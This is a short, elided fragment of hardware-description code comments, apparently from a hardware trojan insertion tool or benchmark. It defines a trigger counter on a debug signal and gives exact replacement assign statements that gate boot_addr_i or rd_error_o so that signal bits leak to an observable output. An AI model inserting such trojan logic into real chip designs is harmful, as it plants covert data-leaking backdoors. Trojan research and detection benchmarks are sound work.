 ...
 *   
 * Trigger: Counter on set_debug_pc_i
 * Payload: Route boot_addr_i[0] to observable output
 * 
...
//   Find the assign for boot_addr_i (or rd_error_o as fallback):
//     assign boot_addr_i = <normal_expr>;
//   Replace with:
//     assign boot_addr_i = trojan_active ? set_debug_pc_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? set_debug_pc_i[0] : 1'b0;
//
